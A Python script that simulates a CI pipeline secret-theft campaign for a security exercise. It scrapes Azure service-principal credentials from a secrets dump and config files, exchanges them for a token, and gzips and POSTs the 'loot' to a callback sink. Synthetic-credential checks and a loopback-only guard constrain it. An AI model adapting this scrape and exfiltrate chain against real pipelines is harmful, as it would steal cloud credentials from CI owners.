"""Synthetic 'wfx'-style CI secret scrape -> use -> exfiltrate demonstration.

This reproduces the detection-relevant shape of the November 2026 campaign
(Aikido/Endor/SafeDep reporting) using only invalid, seeded credentials and
loopback-only network calls. It never reads real runner secrets, contacts a
real cloud, or sends data to a remote host. Every Azure credential set is
checked against an exact synthetic tuple before it is 'used' or exfiltrated,
so dropping a real credential into the fixtures makes the run fail closed.
"""

from __future__ import annotations

import contextlib
import gzip
import json
import os
from pathlib import Path
import sys
from urllib import request as urlrequest

import mock_cloud

FIXTURES = Path(__file__).resolve().parent / "fixtures"
FAKE_SECRET = "SOC-EXERCISE-NOT-A-REAL-SECRET"
EXPECTED = {
    "clientId": "11111111-1111-4111-8111-111111111111",
    "tenantId": "22222222-2222-4222-8222-222222222222",
    "subscriptionId": "33333333-3333-4333-8333-333333333333",
    "clientSecret": FAKE_SECRET,
}
ENV_KEYS = {
    "AZURE_CLIENT_ID": "clientId",
    "AZURE_TENANT_ID": "tenantId",
    "AZURE_SUBSCRIPTION_ID": "subscriptionId",
    "AZURE_CLIENT_SECRET": "clientSecret",
}
# Field name the real payload sets alongside the injected `toJSON(secrets)` dump.
WF_CTOKEN = "SOC-EXERCISE-CAMPAIGN-TOKEN"


def read_fixture(name):
    path = FIXTURES / name
    if FIXTURES.is_symlink() or path.is_symlink() or not path.is_file():
        raise ValueError("Fixture must be a regular, non-symlink file")
    if path.stat().st_size > 16384:
        raise ValueError("Fixture exceeds 16 KiB limit")
    return path.read_text(encoding="utf-8")


def parse_env(text):
    result = {}
    for line in text.splitlines():
        if not line.strip() or line.lstrip().startswith("#"):
            continue
        key, separator, value = line.partition("=")
        if not separator or key not in ENV_KEYS or ENV_KEYS[key] in result:
            raise ValueError("Unexpected or duplicate fixture environment field")
        result[ENV_KEYS[key]] = value
    return result


def scrape_secrets_dump(text):
    """Reproduce the primary vector: parse a `toJSON(secrets)` object.

    Returns the Azure credential set plus the *names only* of any other
    secrets present, modelling 'collect everything, use Azure' without ever
    surfacing non-Azure secret values.
    """
    blob = json.loads(text)
    if not isinstance(blob, dict) or not all(isinstance(v, str) for v in blob.values()):
        raise ValueError("Secrets dump must be a flat JSON object of strings")
    if "AZURE_CREDENTIALS" in blob:
        azure = json.loads(blob["AZURE_CREDENTIALS"])
    else:
        azure = {field: blob[key] for key, field in ENV_KEYS.items() if key in blob}
    other = sorted(name for name in blob if not name.startswith("AZURE_"))
    return {"azure": azure, "other_secret_names": other}


def require_synthetic(credentials):
    if credentials != EXPECTED:
        raise ValueError("Refusing non-synthetic or incomplete fixture credentials")
    return credentials


def _post(url, data, headers):
    if not url.startswith("http://127.0.0.1:"):
        raise ValueError("Refusing non-loopback destination")
    req = urlrequest.Request(url, data=data, headers=headers, method="POST")
    with urlrequest.urlopen(req, timeout=10) as response:  # noqa: S310 (loopback only)
        return response.status, json.loads(response.read().decode("utf-8"))


def simulate_exchange(credentials):
    """In-process stand-in used when no loopback token endpoint is supplied."""
    require_synthetic(credentials)
    return {"mode": "simulation", "authenticated": True, "resource": "mock-canary"}


def use_credentials(credentials, token_url=None):
    """'Use' the scraped Azure credentials against a loopback token endpoint.

    This mirrors a client-credentials token request; it never reaches Entra.
    """
    require_synthetic(credentials)
    if not token_url:
        return simulate_exchange(credentials)
    form = "&".join([
        "grant_type=client_credentials",
        f"client_id={credentials['clientId']}",
        f"client_secret={credentials['clientSecret']}",
        "scope=https://management.azure.com/.default",
    ]).encode("utf-8")
    status, payload = _post(
        f"{token_url}/oauth/token",
        form,
        {"Content-Type": "application/x-www-form-urlencoded"},
    )
    return {
        "mode": "loopback",
        "authenticated": status == 200 and bool(payload.get("access_token")),
        "resource": "mock-canary",
    }


def exfiltrate(loot, sink_url=None):
    """Gzip the loot and POST it to a loopback sink, mirroring WF_CALLBACK.

    Returns a redacted receipt. With no sink it reports what would be sent.
    """
    archive = gzip.compress(json.dumps(loot, sort_keys=True).encode("utf-8"))
    if not sink_url:
        return {"mode": "dry-run", "bytes": len(archive), "delivered": False}
    status, payload = _post(
        f"{sink_url}/exfil",
        archive,
        {"Content-Type": "application/octet-stream",
         "Content-Encoding": "gzip",
         "X-Wf-Ctoken": WF_CTOKEN},
    )
    return {
        "mode": "loopback",
        "bytes": len(archive),
        "delivered": status == 200 and payload.get("status") == "received",
    }


def _scrape_sources():
    """Collect synthetic Azure credentials from every modelled vector."""
    sources = [
        ("env-file:service-principal.env",
         parse_env(read_fixture("service-principal.env"))),
        ("cred-file:azure-credentials.json",
         json.loads(read_fixture("azure-credentials.json"))),
    ]
    dump_text = os.environ.get("WF_SECRETS") or read_fixture("secrets-dump.json")
    dump = scrape_secrets_dump(dump_text)
    sources.append(("toJSON(secrets):WF_SECRETS", dump["azure"]))
    for _, credentials in sources:
        require_synthetic(credentials)
    return sources, dump["other_secret_names"]


def replay(token_url=None, sink_url=None):
    """Run the scrape -> use -> exfiltrate chain against loopback stand-ins."""
    # Validate the metadata-only counterexample up front.
    if json.loads(read_fixture("azureProfile.json")) != {
        "subscriptions": [{
            "id": EXPECTED["subscriptionId"],
            "name": "SOC exercise - metadata only",
            "tenantId": EXPECTED["tenantId"],
            "user": {"name": EXPECTED["clientId"], "type": "servicePrincipal"},
        }]
    }:
        raise ValueError("Unexpected synthetic profile metadata")

    sources, other_names = _scrape_sources()
    events = []
    for source, credentials in sources:
        use = use_credentials(credentials, token_url)
        loot = {"azure": credentials, "other_secret_names": other_names}
        sent = exfiltrate(loot, sink_url)
        events.append({
            "event": "synthetic-credential-scraped",
            "source": source,
            "fields": sorted(credentials),
            "secret": "[REDACTED]",
            "also_collected": other_names,
            "use": {k: v for k, v in use.items() if k != "secret"},
            "exfil": sent,
        })
    events.append({
        "event": "metadata-only",
        "source": "cred-file:azureProfile.json",
        "authenticated": False,
    })
    return events


def main():
    token_url = os.environ.get("WF_TOKEN_URL")
    sink_url = os.environ.get("WF_CALLBACK")
    with contextlib.ExitStack() as stack:
        if not token_url and not sink_url:
            # Fully self-contained demo: stand up loopback services ourselves.
            base, _ = stack.enter_context(mock_cloud.start_mock_services())
            token_url = sink_url = base
        for event in replay(token_url, sink_url):
            print(json.dumps(event, sort_keys=True))


if __name__ == "__main__":
    try:
        main()
    except (ValueError, OSError):
        print("Replay failed: missing, invalid, or non-synthetic inputs", file=sys.stderr)
        sys.exit(1)
